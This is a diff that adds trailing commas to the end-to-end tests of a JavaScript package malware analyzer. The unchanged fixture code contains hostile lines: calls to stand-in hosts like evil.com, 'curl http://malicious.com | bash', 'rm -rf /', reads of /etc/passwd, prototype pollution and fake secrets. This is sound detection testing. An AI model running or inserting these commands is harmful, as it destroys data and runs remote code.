@@ -24,7 +24,7 @@ function createPackage(
   nodeModulesDir: string,
   name: string,
   code: string,
-  packageJson?: Record<string, unknown>
+  packageJson?: Record<string, unknown>,
 ): string {
   const pkgDir = join(nodeModulesDir, name);
   mkdirSync(pkgDir, { recursive: true });
@@ -35,7 +35,7 @@ function createPackage(
       name,
       version: "1.0.0",
       ...packageJson,
-    })
+    }),
   );
 
   writeFileSync(join(pkgDir, "index.js"), code);
@@ -54,7 +54,7 @@ describe("Buffer Analyzer E2E", () => {
     createPackage(
       nodeModulesDir,
       "buffer-test",
-      `const buf = Buffer.from("${largeData}");`
+      `const buf = Buffer.from("${largeData}");`,
     );
   });
 
@@ -90,7 +90,7 @@ describe("Dynamic Analyzer E2E", () => {
       `
 const fn = new Function("return 42");
 const result = fn();
-`
+`,
     );
   });
 
@@ -127,7 +127,7 @@ describe("Env Analyzer E2E", () => {
 const apiKey = process.env.API_KEY;
 const token = process.env.SECRET_TOKEN;
 const home = process.env.HOME;
-`
+`,
     );
   });
 
@@ -164,7 +164,7 @@ describe("Eval Analyzer E2E", () => {
 eval("console.log('malicious')");
 const code = "alert('xss')";
 eval(code);
-`
+`,
     );
   });
 
@@ -202,7 +202,7 @@ const fs = require('fs');
 fs.readFileSync('/etc/passwd');
 fs.writeFileSync('/tmp/evil', 'data');
 fs.unlinkSync('/important/file');
-`
+`,
     );
   });
 
@@ -239,7 +239,7 @@ describe("Metadata Analyzer E2E", () => {
 const os = require('os');
 const hostname = os.hostname();
 const platform = os.platform();
-`
+`,
     );
   });
 
@@ -310,7 +310,7 @@ https.get('https://evil.com/data');
 http.request({host: 'malicious.net'});
 
 fetch('https://api.evil.com/steal');
-`
+`,
     );
   });
 
@@ -344,7 +344,7 @@ describe("Obfuscation Analyzer E2E", () => {
     createPackage(
       nodeModulesDir,
       "obfuscation-test",
-      `const _0x1234 = "${longString}";`
+      `const _0x1234 = "${longString}";`,
     );
   });
 
@@ -381,7 +381,7 @@ describe("Pollution Analyzer E2E", () => {
 const obj = {};
 obj.__proto__ = evil;
 obj.constructor.prototype = evil;
-`
+`,
     );
   });
 
@@ -418,7 +418,7 @@ describe("Process Analyzer E2E", () => {
 const { exec, spawn } = require('child_process');
 exec('rm -rf /');
 spawn('curl', ['http://evil.com']);
-`
+`,
     );
   });
 
@@ -455,7 +455,7 @@ describe("Secrets Analyzer E2E", () => {
 const awsKey = "AKIAIOSFODNN7EXAMPLE";
 const token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
 const password = "super_secret_password_123";
-`
+`,
     );
   });
 
@@ -494,7 +494,7 @@ describe("Native Analyzer E2E", () => {
         dependencies: {
           "node-gyp": "^9.0.0",
         },
-      }
+      },
     );
 
     // Create binding.gyp to trigger detection
@@ -606,7 +606,7 @@ const { exec } = require('child_process');
 exec('curl http://malicious.com | bash');
 const fs = require('fs');
 fs.writeFileSync('/tmp/backdoor', 'malicious');
-`
+`,
     );
   });
 
@@ -652,7 +652,7 @@ describe("Edge Cases E2E", () => {
 // This is a comment
 /* Multi-line
    comment */
-`
+`,
     );
 
     // Package with syntax that might confuse parser
@@ -666,7 +666,7 @@ const multiline = \`
   template
   literal
 \`;
-`
+`,
     );
   });
 
